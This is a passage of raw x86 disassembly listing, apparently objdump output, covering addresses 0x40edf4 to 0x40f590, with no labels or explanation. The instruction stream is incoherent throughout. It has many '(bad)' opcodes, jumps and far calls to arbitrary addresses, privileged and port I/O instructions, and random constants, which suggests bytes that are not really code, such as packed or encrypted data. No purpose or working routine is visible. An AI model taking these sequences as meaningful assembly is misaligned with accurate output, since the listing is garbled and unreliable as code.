  40edf4:	mov    ds:0xce81aaaf,eax
  40edf9:	retf   
  40edfa:	push   eax
  40edfb:	jecxz  0x40ee66
  40edfd:	(bad)  
  40edfe:	into   
  40edff:	stos   DWORD PTR es:[edi],eax
  40ee00:	and    DWORD PTR [esi],edi
  40ee02:	(bad)  [edi+0xe]
  40ee05:	xchg   BYTE PTR [edx-0xf5a1396],al
  40ee0b:	sbb    BYTE PTR [eax-0x15],ah
  40ee0e:	lock mov edx,0xc5920557
  40ee14:	and    esi,DWORD PTR [edx+edx*2-0x54de78a3]
  40ee1b:	ret    0x6d20
  40ee1e:	stc    
  40ee1f:	xor    DWORD PTR [ecx+0xd],edi
  40ee22:	sbb    ebx,ecx
  40ee24:	icebp  
  40ee25:	and    eax,DWORD PTR [edi-0x30cc9453]
  40ee2b:	push   0x3785a648
  40ee30:	jmp    0x3d44288b
  40ee35:	imul   edx,DWORD PTR [eax-0x1dac4c7d],0x7b25ca35
  40ee3f:	adc    BYTE PTR [ebx-0xf],bl
  40ee42:	xchg   edx,eax
  40ee43:	cs je  0x40eded
  40ee46:	push   eax
  40ee47:	stos   DWORD PTR es:[edi],eax
  40ee48:	pop    edi
  40ee49:	(bad)  
  40ee4a:	addr16 pop es
  40ee4c:	dec    esi
  40ee4d:	aas    
  40ee4e:	les    edx,FWORD PTR [ebp+0x59]
  40ee51:	adc    dl,ah
  40ee53:	ss xchg edi,eax
  40ee55:	and    al,0xc3
  40ee57:	and    ch,dh
  40ee59:	add    BYTE PTR [eax+0x55903ebc],bh
  40ee5f:	enter  0xaa81,0x8b
  40ee63:	fist   DWORD PTR [edi-0x61]
  40ee66:	jg     0x40ee7f
  40ee68:	pop    DWORD PTR [ebx+0x4e]
  40ee6b:	cmp    DWORD PTR ds:0x1c598b69,esp
  40ee71:	or     ah,BYTE PTR [eax-0x10e39a2b]
  40ee77:	push   ss
  40ee78:	fcomi  st,st(1)
  40ee7a:	jmp    0x40ee64
  40ee7c:	sbb    al,0xce
  40ee7e:	mov    eax,ds:0x59db08eb
  40ee83:	add    eax,0x836861e1
  40ee88:	mov    dl,0x33
  40ee8a:	test   DWORD PTR [ecx],edx
  40ee8c:	inc    BYTE PTR fs:[esi]
  40ee8f:	out    0xf8,eax
  40ee91:	sbb    ecx,ebx
  40ee93:	mov    eax,0xb23db9b3
  40ee98:	sbb    eax,DWORD PTR [ebx+edx*8]
  40ee9b:	stos   DWORD PTR es:[edi],eax
  40ee9c:	or     al,0x18
  40ee9e:	push   cs
  40ee9f:	sub    BYTE PTR [ebx],0x47
  40eea2:	push   esi
  40eea3:	add    BYTE PTR [esi-0x2],dh
  40eea6:	cli    
  40eea7:	mov    edx,DWORD PTR [ebx+0x633f3b6e]
  40eead:	mov    bh,0xfc
  40eeaf:	sbb    eax,0x7a051796
  40eeb4:	and    al,0x96
  40eeb6:	cmp    eax,0xe25ddfe6
  40eebb:	jns    0x40ef0d
  40eebd:	xor    BYTE PTR [ecx+0x47ec586d],bl
  40eec3:	mov    ds:0xb166089d,al
  40eec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eec9:	xor    al,0xa3
  40eecb:	lods   eax,DWORD PTR ds:[esi]
  40eecc:	push   es
  40eecd:	push   0xa18d2920
  40eed2:	mov    dh,0xfc
  40eed4:	add    esp,DWORD PTR [esi+0x3bdeb25e]
  40eeda:	lock add eax,0x7823ffd6
  40eee0:	mov    dl,0xe6
  40eee2:	cmp    eax,0x7acd44b4
  40eee7:	mov    ebp,0xe7726d43
  40eeec:	dec    ebp
  40eeed:	push   cs
  40eeee:	fst    QWORD PTR [edi+edi*1-0x3238a286]
  40eef5:	fild   DWORD PTR [ecx-0x61]
  40eef8:	cmp    dh,ah
  40eefa:	mov    ecx,0xe9dd5f92
  40eeff:	rcl    DWORD PTR [edx],1
  40ef01:	inc    ebp
  40ef02:	imul   esp,DWORD PTR [eax],0xffffffea
  40ef05:	and    al,0xe6
  40ef07:	push   0x7e
  40ef09:	test   DWORD PTR ds:0x6d39453c,edx
  40ef0f:	cli    
  40ef10:	sbb    esi,ecx
  40ef12:	out    0xf7,eax
  40ef14:	push   es
  40ef15:	dec    esp
  40ef16:	mov    al,ds:0x3409a55e
  40ef1b:	pushf  
  40ef1c:	shl    al,cl
  40ef1e:	adc    al,0x37
  40ef20:	xor    al,ah
  40ef22:	and    ecx,DWORD PTR [eax+ebx*1-0x428b41c2]
  40ef29:	add    cl,dl
  40ef2b:	lea    esi,[edi-0x59]
  40ef2e:	push   esp
  40ef2f:	mov    ebp,0x544372cc
  40ef34:	inc    edx
  40ef35:	dec    edx
  40ef36:	popf   
  40ef37:	cmp    DWORD PTR [edx-0x69],edx
  40ef3a:	pop    ds
  40ef3b:	cmp    BYTE PTR [ebp-0x32],bl
  40ef3e:	xchg   esp,eax
  40ef3f:	(bad)  
  40ef40:	fdiv   st,st(0)
  40ef42:	mov    esp,0x52ef158b
  40ef47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef48:	jno    0x40efbb
  40ef4a:	mov    eax,ds:0x91c8d846
  40ef4f:	push   esi
  40ef50:	mov    ah,0x61
  40ef52:	pop    ebp
  40ef53:	pop    eax
  40ef54:	mov    ebp,ds
  40ef56:	dec    edi
  40ef57:	jbe    0x40eeec
  40ef59:	sub    al,0x70
  40ef5b:	sub    edx,esp
  40ef5d:	js     0x40eee0
  40ef5f:	loopne 0x40ef22
  40ef61:	retf   0x5666
  40ef64:	push   es
  40ef65:	mov    edx,0xeaa09d75
  40ef6a:	push   es
  40ef6b:	inc    edi
  40ef6c:	pop    esp
  40ef6d:	lods   al,BYTE PTR ds:[esi]
  40ef6e:	call   0xb71e9f02
  40ef73:	and    bh,BYTE PTR [ecx-0x15]
  40ef76:	jge    0x40efa3
  40ef78:	and    BYTE PTR [edx-0x4],ah
  40ef7b:	rol    BYTE PTR [eax-0x7e],1
  40ef7e:	jmp    0x40efc9
  40ef80:	scas   eax,DWORD PTR es:[edi]
  40ef81:	clc    
  40ef82:	and    ah,BYTE PTR [ebp+ebx*1+0x19]
  40ef86:	stc    
  40ef87:	in     al,dx
  40ef88:	loope  0x40ef18
  40ef8a:	sbb    eax,0x90f128ec
  40ef8f:	int3   
  40ef90:	jnp    0x40efdb
  40ef92:	pop    ds
  40ef93:	arpl   WORD PTR ds:0x36b120d5,dx
  40ef99:	inc    esp
  40ef9a:	push   0x5eae0bfe
  40ef9f:	mov    BYTE PTR [ebx-0x2b],0x1d
  40efa3:	pop    ds
  40efa4:	cmp    BYTE PTR [eax+0x746a5fde],0x95
  40efab:	repnz addr16 jmp 0x2fb7:0x578a74e6
  40efb4:	xchg   esp,eax
  40efb5:	dec    edx
  40efb6:	pop    edi
  40efb7:	sbb    BYTE PTR [eax],bl
  40efb9:	xor    ebp,DWORD PTR [eax+0x70d6c1ef]
  40efbf:	das    
  40efc0:	pop    eax
  40efc1:	inc    ebp
  40efc2:	pop    edi
  40efc3:	dec    esi
  40efc4:	inc    esp
  40efc5:	test   al,0x6d
  40efc7:	dec    esi
  40efc8:	(bad)  
  40efc9:	and    DWORD PTR [edi+0x3b8e1545],edx
  40efcf:	pop    edx
  40efd0:	push   edx
  40efd1:	aaa    
  40efd2:	jl     0x40ef55
  40efd4:	imul   DWORD PTR ss:[edx+0x17]
  40efd8:	jne    0x40ef97
  40efda:	imul   ecx,DWORD PTR [ecx-0x31],0x3300945c
  40efe1:	aaa    
  40efe2:	add    eax,0x702b9d58
  40efe7:	shr    BYTE PTR [ebp-0x65],0x86
  40efeb:	out    0x8b,eax
  40efed:	xor    dh,BYTE PTR [esi]
  40efef:	imul   eax,DWORD PTR [eax-0x3d],0x45f4613e
  40eff6:	int3   
  40eff7:	(bad)  
  40eff8:	loop   0x40f061
  40effa:	daa    
  40effb:	or     al,BYTE PTR [esi-0x4c]
  40effe:	cmc    
  40efff:	jnp    0x40f01a
  40f001:	outs   dx,BYTE PTR ds:[esi]
  40f002:	push   ss
  40f003:	(bad)  
  40f004:	push   ss
  40f005:	cmp    BYTE PTR [ebx],ah
  40f007:	push   esp
  40f008:	clc    
  40f009:	sbb    al,0xfd
  40f00b:	push   esp
  40f00c:	jmp    0x7526:0xa2bbbcdf
  40f013:	daa    
  40f014:	sub    DWORD PTR [ecx-0x4bef6d4c],esp
  40f01a:	mov    WORD PTR [ebx+0x3e],ss
  40f01d:	jb     0x40f00f
  40f01f:	ins    BYTE PTR es:[edi],dx
  40f020:	ins    BYTE PTR es:[edi],dx
  40f021:	(bad)  
  40f022:	jnp    0x40f022
  40f024:	in     eax,dx
  40f025:	and    eax,0xb58260b2
  40f02a:	push   esi
  40f02b:	pusha  
  40f02c:	push   eax
  40f02d:	push   es
  40f02e:	cmp    eax,0xff5a0fda
  40f033:	and    bh,BYTE PTR [esi+0x3c]
  40f036:	das    
  40f037:	mov    dl,0xf2
  40f039:	aad    0xf1
  40f03b:	mov    DWORD PTR [ecx-0x1f],edx
  40f03e:	cmp    DWORD PTR [ecx+eiz*1-0x5b7f539a],ebx
  40f045:	jb     0x40f0ac
  40f047:	das    
  40f048:	pop    ss
  40f049:	inc    esi
  40f04a:	data16 or BYTE PTR [edi-0x31],ch
  40f04e:	daa    
  40f04f:	ins    DWORD PTR es:[edi],dx
  40f050:	adc    edi,0xffffff81
  40f053:	mov    ebx,eax
  40f055:	fisubr WORD PTR [ecx-0x80]
  40f058:	(bad)  
  40f059:	rol    cl,1
  40f05b:	jmp    0x3115:0x34ad116
  40f062:	aas    
  40f063:	mov    ecx,DWORD PTR [edx]
  40f065:	pushf  
  40f066:	sbb    al,0x12
  40f068:	mov    edx,DWORD PTR [edx]
  40f06a:	sbb    DWORD PTR [edx+eax*2+0x51f7e500],ebx
  40f071:	out    0x5f,eax
  40f073:	sub    ah,BYTE PTR ds:0xde45b8f4
  40f079:	fwait
  40f07a:	nop
  40f07b:	pop    ebp
  40f07c:	push   ebp
  40f07d:	sbb    eax,0x4c36b7d9
  40f082:	int3   
  40f083:	push   esp
  40f084:	(bad)  
  40f085:	cmp    eax,0x3350535c
  40f08a:	pop    esp
  40f08b:	scas   al,BYTE PTR es:[edi]
  40f08c:	push   0x87ae2dc7
  40f091:	sar    DWORD PTR [eax],cl
  40f093:	jp     0x40f027
  40f095:	or     al,0x4b
  40f097:	mov    esp,0xd270638b
  40f09c:	jl     0x40f0ae
  40f09e:	(bad)  
  40f09f:	call   0x617a:0x4a1a1408
  40f0a6:	adc    esi,esp
  40f0a8:	repnz push esp
  40f0aa:	jb     0x40f033
  40f0ac:	adc    edi,DWORD PTR [edi+0x22]
  40f0af:	xchg   esi,eax
  40f0b0:	iret   
  40f0b1:	pop    es
  40f0b2:	adc    esp,edx
  40f0b4:	mov    ah,0x90
  40f0b6:	(bad)  
  40f0b7:	jle    0x40f0af
  40f0b9:	sub    eax,DWORD PTR [edi-0xd7d26ec]
  40f0bf:	sbb    bl,ah
  40f0c1:	mov    esi,0x6bf3a423
  40f0c6:	pop    es
  40f0c7:	ins    BYTE PTR es:[edi],dx
  40f0c8:	jno    0x40f128
  40f0ca:	lahf   
  40f0cb:	sbb    DWORD PTR [edi+0x63219338],ecx
  40f0d1:	push   edx
  40f0d2:	int3   
  40f0d3:	enter  0xc0,0xe4
  40f0d7:	mov    BYTE PTR [eax+0x7f],ah
  40f0da:	loop   0x40f128
  40f0dc:	sub    eax,0x3c46e6e4
  40f0e1:	in     al,0xf4
  40f0e3:	aaa    
  40f0e4:	enter  0xa15d,0x96
  40f0e8:	pushf  
  40f0e9:	outs   dx,DWORD PTR ds:[esi]
  40f0ea:	popa   
  40f0eb:	push   eax
  40f0ec:	add    edx,DWORD PTR [edx]
  40f0ee:	adc    al,0xbb
  40f0f0:	cmp    al,0x3f
  40f0f2:	call   0x62641a40
  40f0f7:	xchg   ecx,eax
  40f0f9:	into   
  40f0fa:	mov    eax,ds:0xb65ea808
  40f0ff:	push   esi
  40f100:	mov    WORD PTR [esi+0x2c],ds
  40f103:	fadd   st(3),st
  40f105:	call   0x8f26:0xe6061344
  40f10c:	imul   ecx,DWORD PTR [ecx+0x5a],0xffffffe7
  40f110:	das    
  40f111:	pop    ebp
  40f112:	out    dx,eax
  40f113:	clc    
  40f114:	inc    edi
  40f115:	les    esi,FWORD PTR [ebp+0x36]
  40f118:	loopne 0x40f16b
  40f11a:	scas   al,BYTE PTR es:[edi]
  40f11b:	cli    
  40f11c:	sub    esi,ecx
  40f11e:	xchg   BYTE PTR [ebp+0x10],ah
  40f121:	push   esi
  40f122:	sti    
  40f123:	es hlt 
  40f125:	and    al,0x7f
  40f127:	mov    edx,0xf999a652
  40f12c:	dec    edx
  40f12d:	fisttp DWORD PTR [edi+edx*1-0x6152fc60]
  40f134:	in     eax,0xe0
  40f136:	and    ebx,ecx
  40f138:	mov    ebp,0x7a8cc0cf
  40f13d:	cmp    BYTE PTR [ecx],cl
  40f13f:	cli    
  40f140:	mov    ah,0x8c
  40f142:	pop    es
  40f143:	stos   DWORD PTR es:[edi],eax
  40f144:	lahf   
  40f145:	aaa    
  40f146:	mov    ecx,DWORD PTR [ebp-0x1447967d]
  40f14c:	mov    al,0x25
  40f14e:	dec    eax
  40f14f:	(bad)  
  40f150:	mov    edi,DWORD PTR [ebx]
  40f152:	xchg   bl,ch
  40f154:	ret    
  40f155:	retf   
  40f156:	pop    eax
  40f157:	cwde   
  40f158:	ds inc ebx
  40f15a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f15b:	and    eax,0x93b8336b
  40f160:	lds    eax,FWORD PTR [edi]
  40f162:	outs   dx,DWORD PTR ds:[esi]
  40f163:	or     eax,0xfbc55aee
  40f168:	sbb    eax,0x45d32d03
  40f16d:	xchg   ebp,eax
  40f16e:	add    ebx,DWORD PTR [esi-0x61]
  40f171:	inc    edx
  40f172:	lahf   
  40f173:	out    0xd1,eax
  40f175:	iret   
  40f176:	mov    bl,0xf0
  40f178:	ja     0x40f13b
  40f17a:	xchg   ebp,eax
  40f17b:	mov    edx,0x380d31aa
  40f180:	inc    edx
  40f181:	push   ebx
  40f182:	and    BYTE PTR [eax],0x54
  40f185:	fstp   TBYTE PTR [ebx-0x79efca8f]
  40f18b:	sbb    edi,DWORD PTR [ebx-0x70]
  40f18e:	jno    0x40f17a
  40f190:	pushf  
  40f191:	xor    DWORD PTR [esi+0x4aee63c],esi
  40f197:	popf   
  40f198:	mov    bh,0x76
  40f19a:	mov    ah,0x50
  40f19c:	and    eax,0x6c8e5659
  40f1a1:	pushf  
  40f1a2:	jae    0x40f187
  40f1a4:	jecxz  0x40f218
  40f1a6:	(bad)  
  40f1a7:	cwde   
  40f1a8:	mov    dh,0xaa
  40f1aa:	ret    
  40f1ab:	mov    eax,ds:0x12374364
  40f1b0:	aad    0x88
  40f1b2:	mov    ebp,DWORD PTR [edi+0x21d8a3db]
  40f1b8:	jae    0x40f1cc
  40f1ba:	sub    DWORD PTR [eax],ebp
  40f1bc:	les    ebx,FWORD PTR [ebp-0xe298434]
  40f1c2:	or     BYTE PTR [edx],bh
  40f1c4:	je     0x40f14d
  40f1c6:	adc    bl,BYTE PTR [ebp+eax*8-0x3]
  40f1ca:	rcl    BYTE PTR [edi],1
  40f1cc:	(bad)  
  40f1cd:	mov    ecx,0x5bbe26ab
  40f1d2:	xlat   BYTE PTR ds:[ebx]
  40f1d3:	test   edx,ecx
  40f1d5:	test   al,0x5e
  40f1d7:	xchg   edi,eax
  40f1d8:	ret    
  40f1d9:	dec    eax
  40f1da:	shl    DWORD PTR [edx+0x1b],1
  40f1dd:	jge    0x40f1d2
  40f1df:	loopne 0x40f1c0
  40f1e1:	ds fwait
  40f1e3:	(bad)  
  40f1e4:	ficom  WORD PTR [ebx]
  40f1e6:	std    
  40f1e7:	fadd   DWORD PTR [esi+0x5c]
  40f1ea:	sbb    esi,DWORD PTR [ecx-0x2b8b1f69]
  40f1f0:	icebp  
  40f1f1:	push   es
  40f1f2:	mov    esi,eax
  40f1f4:	repnz cli 
  40f1f6:	std    
  40f1f7:	adc    al,0x3f
  40f1f9:	sti    
  40f1fa:	fcmovb st,st(0)
  40f1fc:	mov    ds:0x1fa30c3a,al
  40f201:	ret    
  40f202:	das    
  40f203:	mov    eax,ds:0x8f48915a
  40f208:	in     al,dx
  40f209:	mov    ebx,0xbe9c07d4
  40f20e:	and    BYTE PTR [edi-0x56],dh
  40f211:	sub    al,0xc4
  40f213:	mov    dl,0x51
  40f215:	push   eax
  40f216:	xor    BYTE PTR [ebx+0x0],0x66
  40f21a:	loop   0x40f23f
  40f21c:	(bad)  
  40f21d:	pop    esp
  40f21e:	retf   0xe1b5
  40f221:	imul   WORD PTR [edi-0x7]
  40f225:	test   eax,0x246ed0a7
  40f22a:	or     ecx,ebx
  40f22c:	and    edi,ebp
  40f22e:	adc    BYTE PTR [esi],0x5b
  40f231:	repz push ss
  40f233:	(bad)  
  40f235:	ds inc esi
  40f237:	xchg   edx,eax
  40f238:	popa   
  40f239:	push   edi
  40f23a:	pop    eax
  40f23b:	dec    eax
  40f23c:	cdq    
  40f23d:	sbb    eax,0xbc67fdb6
  40f242:	mov    cl,0xdb
  40f244:	ret    0x3235
  40f247:	and    cl,BYTE PTR [edi-0x20]
  40f24a:	cmc    
  40f24b:	mov    esp,DWORD PTR [ebx-0x2983ac09]
  40f251:	mov    eax,0xd0eb2bd
  40f256:	pop    ebp
  40f257:	scas   al,BYTE PTR es:[edi]
  40f258:	scas   al,BYTE PTR es:[edi]
  40f259:	jg     0x40f1f4
  40f25b:	or     eax,0x4557de0a
  40f260:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f261:	out    0x48,al
  40f263:	fld    QWORD PTR [edx+0x6b93e802]
  40f269:	mov    dl,0x12
  40f26b:	test   eax,0xe494e4ae
  40f270:	adc    ah,BYTE PTR [edi]
  40f272:	jbe    0x40f2c1
  40f274:	sar    BYTE PTR [ebx+eax*1-0x22dd9cab],0x8d
  40f27c:	sub    eax,0xa5b8c249
  40f281:	add    DWORD PTR [ebp-0x31],0x57
  40f285:	inc    ebp
  40f286:	pop    esi
  40f287:	jae    0x40f237
  40f289:	cmp    al,0xec
  40f28b:	imul   ecx,DWORD PTR [esi-0x5b],0x27
  40f28f:	mov    edx,0xeccbc4ca
  40f294:	xor    eax,0x88e226c1
  40f299:	stos   BYTE PTR es:[edi],al
  40f29a:	loopne 0x40f2b6
  40f29c:	sub    cl,dh
  40f29e:	xchg   edi,eax
  40f29f:	push   0x27
  40f2a1:	out    0x65,al
  40f2a3:	jmp    0x72e469a0
  40f2a8:	dec    ebp
  40f2a9:	jge    0x40f2b1
  40f2ab:	and    DWORD PTR [edx+0xd],esi
  40f2ae:	add    ecx,DWORD PTR [eax-0x75]
  40f2b1:	mov    edx,0x4fa8a93a
  40f2b6:	scas   eax,DWORD PTR es:[edi]
  40f2b7:	dec    edx
  40f2b8:	cmp    cl,cl
  40f2ba:	xor    DWORD PTR [eax+0x11],esi
  40f2bd:	test   ah,0x24
  40f2c0:	or     ebx,ecx
  40f2c2:	jecxz  0x40f324
  40f2c4:	push   esp
  40f2c5:	arpl   dx,bx
  40f2c7:	inc    eax
  40f2c8:	pop    eax
  40f2c9:	ret    0x6c32
  40f2cc:	shl    DWORD PTR [edi+0x7c],1
  40f2cf:	sbb    esp,esp
  40f2d1:	push   esi
  40f2d2:	arpl   WORD PTR [ebx],bx
  40f2d4:	inc    edx
  40f2d5:	dec    ebp
  40f2d6:	mov    edx,0xcc1fd86a
  40f2db:	fs cli 
  40f2dd:	loop   0x40f271
  40f2df:	scas   al,BYTE PTR es:[edi]
  40f2e0:	stos   DWORD PTR es:[edi],eax
  40f2e1:	popa   
  40f2e2:	daa    
  40f2e3:	and    edx,DWORD PTR [esi]
  40f2e5:	call   0xd3ce:0x1e76eab0
  40f2ec:	ret    0xd9ac
  40f2ef:	sub    BYTE PTR gs:[edx-0x12],ah
  40f2f3:	or     BYTE PTR [eax-0x5d80fa4f],dl
  40f2f9:	and    BYTE PTR [ecx+eax*8+0x3c],cl
  40f2fd:	imul   eax,DWORD PTR [ebp-0x12],0x66
  40f301:	je     0x40f2eb
  40f303:	push   edx
  40f304:	adc    eax,0x5915cefe
  40f309:	stc    
  40f30a:	shl    BYTE PTR [ebp-0x43],0xa3
  40f30e:	test   eax,0x94bacc50
  40f313:	mov    esp,0x2747b0c6
  40f318:	mov    ebp,0x2852789
  40f31d:	add    BYTE PTR [ecx],al
  40f31f:	lock enter 0x3b13,0xf7
  40f324:	push   0x9c558c87
  40f329:	ret    0x9c20
  40f32c:	fistp  WORD PTR [ecx+edx*4-0x15]
  40f330:	adc    al,0x5f
  40f332:	out    0xe0,al
  40f334:	imul   ecx,DWORD PTR [esi],0x9
  40f337:	xor    DWORD PTR [ebx],esp
  40f339:	mov    esp,0x94fc1d1
  40f33e:	push   edx
  40f33f:	dec    edi
  40f340:	sbb    eax,0x28a7eddc
  40f345:	out    dx,al
  40f346:	sub    DWORD PTR [ebx+0x9],ebx
  40f349:	gs push es
  40f34b:	xchg   ecx,eax
  40f34c:	ss mov dh,bl
  40f34f:	enter  0xd071,0xe1
  40f353:	(bad)  
  40f354:	xlat   BYTE PTR ds:[ebx]
  40f355:	push   ebx
  40f356:	out    0x42,al
  40f358:	cmp    eax,0x67bd170d
  40f35d:	jmp    0xe4db92bd
  40f362:	mov    al,ds:0x6b15e9c1
  40f367:	fimul  DWORD PTR [eax-0x6d47e0d3]
  40f36d:	push   edx
  40f36e:	jl     0x40f3a3
  40f370:	and    eax,0xa4306b46
  40f375:	mov    BYTE PTR [eax-0x40],ch
  40f378:	push   0x60
  40f37a:	mov    ds:0x367bf30a,eax
  40f37f:	pop    eax
  40f380:	pop    ebx
  40f381:	and    al,0x47
  40f383:	cdq    
  40f384:	xchg   esp,eax
  40f385:	ja     0x40f356
  40f387:	jbe    0x40f3bb
  40f389:	xchg   esi,eax
  40f38a:	(bad)  
  40f38c:	and    eax,0x2ab77943
  40f391:	enter  0x46b5,0x32
  40f395:	push   ebp
  40f396:	cmp    ebx,DWORD PTR [eax]
  40f398:	dec    ebp
  40f399:	aaa    
  40f39a:	ds lahf 
  40f39c:	call   0xf2e9fcd6
  40f3a1:	test   eax,0x541d3588
  40f3a6:	cli    
  40f3a7:	div    BYTE PTR [ebp-0x59c70325]
  40f3ad:	lods   eax,DWORD PTR ds:[esi]
  40f3ae:	mov    al,0xd9
  40f3b0:	pop    edx
  40f3b1:	bound  edi,QWORD PTR [ebx]
  40f3b3:	call   0x6b13:0x2bce34d7
  40f3ba:	sahf   
  40f3bb:	pop    ss
  40f3bc:	mov    ?,ebp
  40f3be:	jg     0x40f42c
  40f3c0:	dec    edi
  40f3c1:	xor    al,0x39
  40f3c3:	dec    eax
  40f3c4:	or     cl,dh
  40f3c6:	sub    dl,bl
  40f3c8:	sbb    eax,0x232df017
  40f3cd:	xor    BYTE PTR [ecx+0x5ae2809f],ah
  40f3d3:	mov    al,0x6b
  40f3d5:	clc    
  40f3d6:	adc    ebp,DWORD PTR [edx]
  40f3d8:	jmp    0x40f442
  40f3da:	inc    eax
  40f3db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3dc:	push   es
  40f3dd:	cmp    al,0x8b
  40f3df:	mov    ecx,0xe22356f0
  40f3e4:	test   ch,dh
  40f3e6:	fs and ch,bh
  40f3e9:	or     esp,DWORD PTR [eax+0x29982fcc]
  40f3ef:	dec    ebp
  40f3f0:	mov    cl,0xe
  40f3f2:	lods   eax,DWORD PTR ds:[esi]
  40f3f3:	mov    ebp,DWORD PTR [ebp-0x10a8a3ab]
  40f3f9:	sbb    edi,0x46abb8f8
  40f3ff:	test   BYTE PTR [esi-0x188d810a],bl
  40f405:	adc    BYTE PTR [ebp-0x254839e3],al
  40f40b:	repz retf 0x9065
  40f40f:	retf   
  40f410:	pop    esp
  40f411:	fisttp QWORD PTR [edi+0x38]
  40f414:	loopne 0x40f409
  40f416:	pop    DWORD PTR [edi]
  40f418:	mov    ebx,0x6da4b7f3
  40f41d:	cmp    BYTE PTR [eax+edx*8+0x2f06add2],bl
  40f424:	sar    BYTE PTR [edx],cl
  40f426:	sbb    BYTE PTR [edx],al
  40f428:	push   0xffffffa2
  40f42a:	arpl   WORD PTR [esi+edx*8],bp
  40f42d:	popf   
  40f42e:	fcmovbe st,st(7)
  40f430:	fmul   DWORD PTR [edi-0x59724b41]
  40f436:	xor    BYTE PTR [eax+edx*4],dh
  40f439:	push   edx
  40f43a:	inc    ebp
  40f43b:	dec    edi
  40f43c:	push   esp
  40f43d:	call   0x73c2:0x248371c1
  40f444:	jb     0x40f45f
  40f446:	stos   DWORD PTR es:[edi],eax
  40f447:	jg     0x40f45a
  40f449:	lock pop edx
  40f44b:	ret    0xd8a7
  40f44e:	dec    edi
  40f44f:	leave  
  40f450:	(bad)  
  40f452:	pop    eax
  40f453:	pop    ebp
  40f454:	nop
  40f455:	sti    
  40f456:	add    al,0x8b
  40f458:	psubusw mm3,QWORD PTR [ecx]
  40f45b:	sub    dh,bl
  40f45d:	std    
  40f45e:	repz dec esi
  40f460:	(bad)  
  40f461:	jno    0x40f45b
  40f463:	cmovnp ecx,DWORD PTR [edi-0x5204d71f]
  40f46a:	(bad)  
  40f46b:	aas    
  40f46c:	push   edi
  40f46d:	mov    esi,DWORD PTR [ebx+0x7204c20a]
  40f473:	inc    ebp
  40f474:	(bad)  
  40f475:	cdq    
  40f476:	jo     0x40f48d
  40f478:	rol    DWORD PTR [edx+0xc88dcbd],cl
  40f47e:	xor    eax,0xa2240790
  40f483:	mov    ds:0xe286f082,al
  40f488:	xlat   BYTE PTR ds:[ebx]
  40f489:	scas   al,BYTE PTR es:[edi]
  40f48a:	pop    es
  40f48b:	mov    al,0x81
  40f48d:	jl     0x40f4a6
  40f48f:	jmp    0x96d79254
  40f494:	add    ch,dl
  40f496:	scas   al,BYTE PTR es:[edi]
  40f497:	icebp  
  40f498:	push   edx
  40f499:	mov    edi,ecx
  40f49b:	gs or  al,0xd7
  40f49e:	retf   0x74b2
  40f4a1:	sar    edi,1
  40f4a3:	sub    cx,si
  40f4a6:	push   esp
  40f4a7:	aad    0x27
  40f4a9:	enter  0x36ba,0xa7
  40f4ad:	add    dh,0x12
  40f4b0:	or     ah,al
  40f4b2:	and    DWORD PTR ds:0xc33f6ab6,eax
  40f4b8:	pop    ebx
  40f4b9:	pop    es
  40f4ba:	ret    0x1419
  40f4bd:	push   edx
  40f4be:	out    0xfa,eax
  40f4c0:	mov    dl,0x6e
  40f4c2:	and    edx,DWORD PTR [ecx-0x5e]
  40f4c5:	push   ss
  40f4c6:	int    0x4f
  40f4c8:	das    
  40f4c9:	or     BYTE PTR [edi-0x2329a8c5],ch
  40f4cf:	int3   
  40f4d0:	dec    edx
  40f4d1:	dec    eax
  40f4d2:	add    ecx,ebp
  40f4d4:	pop    ecx
  40f4d5:	sub    eax,0xa67ef7a6
  40f4da:	aad    0xa6
  40f4dc:	mov    esi,edx
  40f4de:	pop    eax
  40f4df:	push   edx
  40f4e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4e1:	or     edi,DWORD PTR [edi+0x41]
  40f4e4:	fbstp  TBYTE PTR [edi+0x1af361cc]
  40f4ea:	(bad)  [eax+0x4a013820]
  40f4f0:	push   ds
  40f4f1:	ret    0xba38
  40f4f4:	in     al,0xd5
  40f4f6:	cli    
  40f4f7:	jae    0x40f4d4
  40f4f9:	inc    ebp
  40f4fa:	mov    ebx,0xc6b298b6
  40f4ff:	loop   0x40f4e8
  40f501:	in     eax,dx
  40f502:	and    edx,edx
  40f504:	call   0x97c1:0xd4d763b0
  40f50b:	popa   
  40f50c:	xchg   BYTE PTR [edx+0x36],ah
  40f50f:	div    BYTE PTR [esi]
  40f511:	out    dx,al
  40f512:	mov    ebp,0xab7792df
  40f517:	leave  
  40f518:	ret    
  40f519:	push   ebp
  40f51a:	iret   
  40f51b:	or     dl,BYTE PTR [eax+eiz*1-0x1e]
  40f51f:	mov    ah,0x69
  40f521:	push   esi
  40f522:	jle    0x40f559
  40f524:	fcomp  DWORD PTR [ebp-0x2b2e93c7]
  40f52a:	shl    bl,1
  40f52c:	dec    eax
  40f52d:	fistp  WORD PTR [edx+0x6]
  40f531:	retf   
  40f532:	scas   al,BYTE PTR es:[edi]
  40f533:	inc    eax
  40f534:	push   0x41
  40f536:	mov    ch,0x4a
  40f538:	xor    eax,edx
  40f53a:	xor    edx,esp
  40f53c:	xor    eax,0xff43e6d7
  40f541:	cli    
  40f542:	sub    eax,0xafb8404d
  40f547:	aam    0xdd
  40f549:	stos   BYTE PTR es:[edi],al
  40f54a:	add    ecx,DWORD PTR [eax]
  40f54c:	daa    
  40f54d:	jg     0x40f4d6
  40f54f:	cmp    DWORD PTR [ebp+0x5b52ddd9],edx
  40f555:	inc    ebx
  40f556:	adc    al,0x73
  40f558:	stc    
  40f559:	xchg   ebp,eax
  40f55a:	adc    eax,0xc1c4c4d2
  40f55f:	int    0x6e
  40f561:	ffree  st(3)
  40f563:	inc    DWORD PTR [ecx-0x8]
  40f566:	push   esi
  40f567:	mov    esi,0xb78f8051
  40f56c:	push   ss
  40f56d:	mov    ch,0xea
  40f56f:	cmp    cl,dh
  40f571:	push   0x71a00e61
  40f576:	xchg   ebx,eax
  40f577:	in     al,dx
  40f578:	and    eax,0x1a31d2fd
  40f57d:	mov    DWORD PTR [ecx-0x43],ecx
  40f580:	mov    al,0x4c
  40f582:	xor    eax,0xcb9e360f
  40f587:	pop    es
  40f588:	addr16 push es
  40f58a:	xchg   edx,eax
  40f58b:	fcom   st(3)
  40f58d:	mov    al,0x89
  40f58f:	dec    eax
  40f590:	daa    
